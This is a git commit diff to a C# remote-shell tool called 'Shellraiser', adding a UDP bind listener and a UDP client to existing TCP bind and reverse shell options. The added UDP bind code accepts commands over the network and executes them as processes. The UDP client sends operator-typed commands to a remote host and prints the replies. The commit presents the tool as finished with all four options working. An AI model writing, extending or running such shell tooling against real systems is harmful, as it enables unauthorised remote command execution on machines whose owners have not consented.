de7fb81d97589f5f31b8946546735cc04b8b6599
mellonaut <65114647+mellonaut@users.noreply.github.com>
2023-01-22 13:35:14 -0500

    I think this is 1.0. All four options working

--- ShellRunner.cs
+++ ShellRunner.cs
@@ -38,6 +38,11 @@ namespace Shellraiser
                 // call the Reverse function with the provided IP address and port
                 Reverse(ipAddress, port);
             }
+            else if (option == "-c")
+            {
+                // UDP Client
+                UDPClient(ipAddress, port);
+            }    // 
             else
             {
                 Console.WriteLine("Invalid option. Usage: ");
@@ -50,8 +55,10 @@ namespace Shellraiser
             Console.WriteLine("Usage: ShellRunner OPTION IP_ADDRESS PORT");
             Console.WriteLine("OPTIONS:");
             Console.WriteLine("-b: TCP Bind");
+            Console.WriteLine("-r: TCP Reverse");
             Console.WriteLine("-u: UDP Bind");
-            Console.WriteLine("-r: Reverse");
+            Console.WriteLine("-c: UDP Client");
+            
         }
 
         private static void TCPBind(string ipAddress, int port)
@@ -111,13 +118,7 @@ namespace Shellraiser
                 }
             }
         }
-
-        private static void UDPBind(string ipAddress, int port)
-        {
-            // your code for the UDP bind option here
-        }
         
-
         // Reverse TCP Shell taking IP and Port
         private static void Reverse(string ipAddress, int port)
         {
@@ -178,8 +179,112 @@ namespace Shellraiser
             }
         }
 
+        // UDP Client
+        private static void UDPClient(string ipAddress, int port)
+        {
+            using (UdpClient listener = new UdpClient(port))
+            {
+                IPEndPoint remoteEP = new IPEndPoint(IPAddress.Any, port);
+                string output;
+                byte[] bytes;
 
+                using (Socket sock = new Socket(AddressFamily.InterNetwork,
+                                                SocketType.Dgram,
+                                                ProtocolType.Udp))
+                {
 
+                    IPAddress addr = IPAddress.Parse(ipAddress);
+                    IPEndPoint addrEP = new IPEndPoint(addr, port);
+
+                    Console.WriteLine("Enter command to send, blank line to quit");
+                    while (true)
+                    {
+                        string command = Console.ReadLine();
+
+                        byte[] buff = Encoding.ASCII.GetBytes(command);
+                        try
+                        {
+                            sock.SendTo(buff, addrEP);
+
+                            if (string.IsNullOrEmpty(command))
+                            {
+                                sock.Close();
+                                listener.Close();
+                                return;
+                            }
+
+                            if (string.IsNullOrWhiteSpace(command))
+                                continue;
+
+                            bytes = listener.Receive(ref remoteEP);
+                            output = Encoding.ASCII.GetString(bytes, 0, bytes.Length);
+                            Console.WriteLine(output);
+                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine(" Exception {0}", ex.Message);
+                        }
+                    }
+                }
+            }
+        }
+
+        private static void UDPBind(string ipAddress, int port)
+        {
+            IPEndPoint localEP = new IPEndPoint(IPAddress.Parse(ipAddress), port);
+            UdpClient udpListener = new UdpClient(localEP);
+
+            Console.WriteLine("Listening for incoming connections on " + ipAddress + ":" + port);
+
+            while (true)
+            {
+                IPEndPoint remoteEP = null;
+                byte[] bytes;
+                try
+                {
+                    bytes = udpListener.Receive(ref remoteEP);
+                }
+                catch (SocketException e)
+                {
+                    Console.WriteLine(e.Message);
+                    udpListener.Close();
+                    return;
+                }
+
+                string command = Encoding.ASCII.GetString(bytes);
+                if (string.IsNullOrEmpty(command))
+                {
+                    udpListener.Close();
+                    return;
+                }
+                if (string.IsNullOrWhiteSpace(command))
+                    continue;
+
+                string[] split = command.Trim().Split(' ');
+                string filename = split.First();
+                string arg = string.Join(" ", split.Skip(1));
+
+                try
+                {
+                    Process prc = new Process();
+                    prc.StartInfo = new ProcessStartInfo();
+                    prc.StartInfo.FileName = filename;
+                    prc.StartInfo.Arguments = arg;
+                    prc.StartInfo.UseShellExecute = false;
+                    prc.StartInfo.RedirectStandardOutput = true;
+                    prc.Start();
+
+                    prc.WaitForExit();
+                    string result = prc.StandardOutput.ReadToEnd();
+                    Console.WriteLine("Output from " + filename + ": " + result);
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine("Error running " + filename + ": " + e.Message);
+                }
+            }
+            udpListener.Close();
+        }
 
 
         //
